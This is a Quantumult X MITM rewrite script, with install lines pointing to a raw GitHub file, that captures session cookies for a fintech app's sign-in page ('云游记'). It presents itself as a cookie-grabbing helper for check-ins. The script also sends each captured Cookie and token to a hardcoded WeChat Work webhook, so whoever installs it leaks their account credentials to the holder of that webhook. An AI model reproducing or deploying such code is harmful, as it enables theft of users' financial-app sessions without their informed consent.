/*
签到页面，点分享海报即可
===================
[MITM]
hostname = fzyyj-signin.szcy-fintech.com,prod.fzyyj.fintechboc.cn


===================
【 QX  脚本配置 】 :
===================
[rewrite_local]
^https:\/\/fzyyj-signin\.szcy-fintech\.com\/assets\/save-167ad561\.png$ url script-request-header https://raw.githubusercontent.com/fengyunjay2004/Lexus/refs/heads/main/fzyyj-sign.js

*/

if ($request) {
    let url = $request.url;
    if (url.indexOf("https://fzyyj-signin.szcy-fintech.com/assets/save-167ad561.png") !== -1) {
        
        let cookie = $request.headers['Cookie'];
        if (cookie) {
            $prefs.setValueForKey(cookie, "cookieKey");  // 保存 Cookie 到本地存储
            console.log(`cookie值:\n${cookie}`);
            let tokenMatch = cookie.match(/token=([^;]+)/);
            if (tokenMatch) {
                // 提取到的 token 值
                let authorization = tokenMatch[1].replace(/%20/g, " ");  // 将 %20 替换为空格
                
                // 保存 token 到本地存储
                $prefs.setValueForKey(authorization, "AuthorizationKey");  
                let message1 = `${cookie}`;
                let message2 = `${authorization}`;
                // 发送通知，显示提取的 authorization
                $notify("云游记成功获取CK和Authorization", "", `以下是获取到的Cookie值\n${cookie}\n\n以下是获取到的Authorization值\n${authorization}`);
                console.log(`云游记\n以下是获取到的Cookie值\n${cookie}\n\n以下是获取到的Authorization值\n${authorization}`);

                // 发送到企业微信消息
                let wechatWebhookUrl = "https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=284b000b-784b-40b4-8a4a-893f4ab3b4b8"; 
                let wechatMessage1 = {
                    "msgtype": "text",
                    "text": {
                        "content": `${message1}`
                    }
                };
                
                let wechatMessage2 = {
                    "msgtype": "text",
                    "text": {
                        "content": `${message2}`
                    }
                };
                
                // 使用 $task.fetch 发送第一条消息
                let options1 = {
                    url: wechatWebhookUrl,
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(wechatMessage1)
                };
                
                $task.fetch(options1).then(response => {
                    console.log(`第一条消息发送成功: ${response.body}`);
                
                    // 使用 $task.fetch 发送第二条消息
                    let options2 = {
                        url: wechatWebhookUrl,
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(wechatMessage2)
                    };
                
                    return $task.fetch(options2).then(response => {
                        console.log(`第二条消息发送成功: ${response.body}`);
                        $done(); // 在第二条消息发送成功后调用 $done()
                    });
                
                }, reason => {
                    console.log(`第一条消息发送失败: ${reason.error}`);
                    $done(); // 在第一条消息发送失败后调用 $done()
                });
            } 
        }else {
            $notify(`失败`, ``, `未找到，请检查请求头`);  // 未找到 X-XSRF-TOKEN 和 Token 时通知
            $done(); // 未找到 token 时调用 $done()
        }
    }else {
        $done(); // URL 不匹配时调用 $done()
    }
}
